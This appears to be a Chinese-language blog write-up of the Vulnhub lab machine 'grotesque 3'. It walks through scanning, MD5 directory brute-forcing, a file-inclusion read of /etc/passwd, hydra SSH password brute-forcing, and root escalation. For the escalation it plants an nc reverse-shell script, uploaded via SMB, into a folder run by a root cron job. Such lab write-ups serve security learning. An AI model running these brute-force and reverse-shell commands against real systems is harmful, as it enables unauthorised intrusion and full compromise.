---
layout: post
title: grotesque 3
subtitle: grotesque 3
date: 2023-07-18 16:00
author: Kyon-H
header-img: img/post-bg-2015.jpg
tags:
  - 靶场实战
  - Vulnhub
published: true
number headings: first-level 3, max 4, 1.1., auto
---

### 1. 信息搜集

IP 扫描，发现主机 `192.168.163.142`

![image.png](https://img.ghostliner.top/mCSICN.png)

端口扫描，发现 80、22 端口

```shell
nmap -A -p- 192.168.163.142
```

![image.png](https://img.ghostliner.top/8D8uXo.png)

目录扫描，但未扫到任何东西

```shell
dirsearch -u http://192.168.163.142 -e* -i 200
nikto -h 192.168.163.142
dirb http://192.168.163.142
```

访问网站，发现链接

![image.png](https://img.ghostliner.top/8pFKYf.png)

访问链接： <http://192.168.163.142/atlasg.jpg> 发现一张图片

从图片中找有字符的地方

![image.png](https://img.ghostliner.top/cPcVDy.png)

有 `M` ，`D` 和 5 个 `X`，暗示 MD5

使用 atlasg、atlasg.jpg 和图片文件的 MD5 值尝试访问失败

### 2. 目录爆破

生成 MD5 的目录字典

```shell
for i in $(cat /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-small.txt); do echo $i | md5sum >> md5.txt; done
```

vim 删除多余字符

```vim
:%s/  -//g
```

```shell
dirsearch -w md5.txt -u http://192.168.163.142 -f php
```

![image.png](https://img.ghostliner.top/QMVN2d.png)

<http://192.168.163.142/f66b22bf020334b04c7d0d3eb5010391.php>

```shell
wfuzz -w /usr/share/wordlists/rockyou.txt -u http://192.168.163.142/f66b22bf020334b04c7d0d3eb5010391.php?FUZZ=/etc/passwd --hw 0
```

发现文件包含漏洞

![image.png](https://img.ghostliner.top/LMjc9X.png)

发现用户：`freddie`

![image.png](https://img.ghostliner.top/qviORT.png)

尝试日志注入，无法获取日志文件，尝试爆破 ssh

### 3. SSH 爆破

使用之前生成的 MD5 字典进行爆破

```shell
hydra -l freddie -P md5.txt ssh://192.168.163.142
```

![image.png](https://img.ghostliner.top/F8whFB.png)

获得密码：`61a4e3e60c063d1e472dd780f64e6cad`

ssh 登陆成功，发现日志文件目录权限高，无法访问

![image.png](https://img.ghostliner.top/GLqBEW.png)

查看家目录

![image.png](https://img.ghostliner.top/3cRIWy.png)

查看 flag 文件

![image.png](https://img.ghostliner.top/D60gui.png)

查看端口服务，发现 139、445

```shell
ss -tnlp
```

![image.png](https://img.ghostliner.top/D6Kbdx.png)

使用 smbclient 访问 SMB 服务中的文件共享

```shell
smbclient -L 127.0.0.1
```

发现目录 `grotesque`

![image.png](https://img.ghostliner.top/aVknwb.png)

查看，无内容

![image.png](https://img.ghostliner.top/caTICs.png)

下载 pspy64 [DominicBreuker/pspy: Monitor linux processes without root permissions](https://github.com/DominicBreuker/pspy?tab=readme-ov-file) 监控 Linux 进程和定时任务

上传到目标机

![image.png](https://img.ghostliner.top/AIFk9w.png)

```shell
chmod +x pspy64
./pspy64
```

发现每分钟以 root 身份执行`/smbshare`目录下脚本

![image.png](https://img.ghostliner.top/dwYK0C.png)

### 4. root 提权

添加自定义脚本，反弹 shell

```shell
echo 'nc -nv 192.168.163.132 4444 -e /bin/bash' > shell.sh
```

直接写入无权限，利用 smb 传入脚本文件

```shell
smbclient //127.0.0.1/grotesque
put shell.sh
```

![image.png](https://img.ghostliner.top/k86oxf.png)

kali 开启监听 `nc -lvp 4444`

连接成功获取到 flag

![image.png](https://img.ghostliner.top/P5Gqum.png)
